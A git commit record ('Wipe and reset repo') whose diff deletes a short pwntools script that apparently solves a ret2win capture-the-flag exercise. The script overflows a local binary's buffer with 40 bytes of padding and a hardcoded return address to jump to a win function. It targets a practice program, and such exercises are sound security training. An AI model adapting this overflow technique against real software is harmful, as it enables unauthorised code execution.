365333899b5dd17326209fe3ddd76dc0412581fa
anotherme13 <lovelyboy@DESKTOP-110ET22.>
2025-05-08 16:57:12 +0700

    Wipe and reset repo

--- sol_ret2win.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-p = process('./ret2win')
-
-#0x400764
-t = p64(0x400764)
-print(t)
-p.sendlineafter(b'> ',b'a' * (32 + 8) + b'\x64\x07\x40\x00\x00\x00\x00\x00')
-t = p.recvall(timeout=0.5)
-print(t)
